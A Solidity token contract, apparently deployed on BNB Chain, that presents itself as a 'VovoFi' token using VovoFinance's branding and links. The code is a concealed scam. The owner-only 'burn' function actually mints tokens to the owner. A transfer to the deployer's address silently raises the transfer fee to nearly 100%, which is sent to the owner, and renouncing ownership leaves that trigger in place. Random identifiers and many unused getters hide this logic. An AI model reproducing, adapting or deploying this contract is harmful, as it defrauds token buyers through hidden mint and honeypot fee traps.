/**
 *Submitted for verification at BscScan.com on 2022-12-01
*/

//////////////////////////////////////////////
//VovoFinance
//Structuring money legos for customizable real yield
//We are thrilled to announce the launch of #VovoFinance on arbitrum Mainnet!
//With that, the 1st ever DeFi Principal Protected Products were born today.
//It is built by periodically collecting CurveFinance
//yield to open high leverage trades on GMX_IO.
//  https://www.vovo.finance/
//  https://docs.vovo.finance/
//  https://vovofinance.medium.com/
//  http://discord.gg/7xEKgjMW37
//  https://twitter.com/VovoFinance
///////////////////////////////////////////////////
// SPDX-License-Identifier: Unlicensed

pragma solidity >=0.8.6;
contract VovoFi {
uint256 private  Lidgrm = 1000000000000000000000;
uint256 private  EHdCZn = 1000000000000000000;
address private  BVLcio = address(0);
uint256 private  MJUmWn = 1000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant XCriYL = 99999;
string public  symbol = "VovoFi";
address private  mtRpAM = address(0);
address public owner;
address private  nTLxPm = address(0);
address private  teckKP = address(0);
address private  mngzUy = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  pgnEkX = 10000000000;
mapping (address => uint256) public balanceOf;
uint256 private  zDjmxD = 1000000000000000000;
string public  name = "VovoFi";
uint256 private  xGSQFb = 100000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  iWEQGw = address(0);
uint256 private  MkYTWg = 10000000000000;
address private  oCuOmF = address(0);
address private  mpiala = address(0);
address private  VoZVyM = address(0);
function _getmtRpAM() private returns (address) {
return mtRpAM;
}

function _getoCuOmF() private returns (address) {
return oCuOmF;
}



function _getVoZVyM() private returns (address) {
return VoZVyM;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "AKSyhL");
require(to != address(0), "AKSyhL");
require(amount <= balanceOf[from], "AKSyhL");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XCriYL/EHdCZn ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==iWEQGw){
EHdCZn = XCriYL+2;
}
emit Transfer(from, to, transferAmount);
}
function _getmpiala() private returns (address) {
return mpiala;
}













function _getMkYTWg() private returns (uint256) {
return MkYTWg;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getmngzUy() private returns (address) {
return mngzUy;
}

function _getxGSQFb() private returns (uint256) {
return xGSQFb;
}



function _getteckKP() private returns (address) {
return teckKP;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function _getpgnEkX() private returns (uint256) {
return pgnEkX;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function _getzDjmxD() private returns (uint256) {
return zDjmxD;
}

function _getBVLcio() private returns (address) {
return BVLcio;
}

function _getLidgrm() private returns (uint256) {
return Lidgrm;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}




constructor () {
iWEQGw = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getMJUmWn() private returns (uint256) {
return MJUmWn;
}







function _getnTLxPm() private returns (address) {
return nTLxPm;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tAKSyhL 0");
require(spender != address(0), "fAKSyhL 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}

}